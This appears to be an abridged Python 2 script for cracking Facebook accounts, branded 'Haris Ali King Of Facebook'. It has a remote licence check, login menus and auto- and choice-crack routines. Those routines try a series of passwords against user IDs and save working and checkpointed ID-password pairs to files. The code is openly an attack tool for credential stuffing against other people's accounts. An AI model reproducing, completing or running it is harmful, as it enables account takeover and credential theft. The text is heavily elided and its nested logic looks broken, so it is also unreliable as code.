...
__copyright = 'All rights reserved . Copyright  Haris Ali'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/harisali90/main/server.txt').text
    if to in r:
...
def log_menu_s():
    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80Haris Ali\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Haris Ali\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Hars Ali\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m{Haris Ali King Of Facebook}\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass1
                cp = open('Ali_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass2
                    cp = open('Ali_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass3
                        cp = open('Ali_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'loc' in q:
                            ...
                            print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass4
                            cp = open('Ali_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'loc' in q:
                                ...
                                print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass5
                                cp = open('Ali_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'loc' in q:
                                    ...
                                    ok = open('/sdcard/ids/Ali_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass6
                                    cp = open('Ali_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'loc' in q:
                                        ...
                                        print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass7
                                        cp = open('Ali_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'loc' in q:
                                            ...
                                            print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass8
                                            cp = open('Ali_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            if 'loc' in q:
                                                ...
                                                print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass9
                                                cp = open('Ali_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                if 'loc' in q:
                                                    ...
                                                    print '\x1b[1;31;1m[Ali-CP] ' + uid + ' | ' + pass10
                                                    cp = open('Ali_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Haris Ali\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94m{Haris Ali King Of Facebook}\x1b[1;91m'
    print 47 * '-'
